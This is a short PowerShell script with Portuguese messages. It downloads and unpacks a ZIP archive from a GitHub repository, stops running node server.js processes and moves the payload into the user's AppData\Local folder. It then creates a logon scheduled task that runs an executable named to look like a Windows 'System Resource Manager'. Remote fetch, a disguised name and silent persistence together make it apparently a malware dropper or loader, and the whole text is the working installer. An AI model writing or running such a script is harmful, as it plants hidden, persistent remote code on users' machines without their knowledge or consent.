Invoke-RestMethod "https://github.com/n0shadow/config/raw/refs/heads/main/Server.zip" -OutFile "a.zip";
Expand-Archive -Path "a.zip" -DestinationPath ".";
Remove-Item "a.zip";

$tsk = "GerenciadorRecursos"

schtasks.exe /end /tn $tsk
schtasks.exe /delete /tn $tsk /f

Get-Process -Name "Gerenciador de Recursos do Sistema" -ErrorAction SilentlyContinue | Stop-Process -Force
Get-CimInstance Win32_Process -Filter "Name = 'node.exe'" | Where-Object { $_.CommandLine -like "*server.js*" } | Stop-Process -Force

$usrPath = $PWD.Path
$dest = Join-Path $usrPath "AppData\Local"

try {
    rm -r -force "$dest\Server"
    Move-Item "Server" $dest -Force
} catch {
    Write-Host("Erro ao mover");
    exit 1;
}

$usr = Split-Path $usrPath -Leaf
$exec = Join-Path $dest "Gerenciador de recursos do sistema.exe"

schtasks.exe /create `
    /tn $tsk `
    /tr "'$exec'" `
    /sc onlogon `
    /ru "$usr" `
    /rl limited
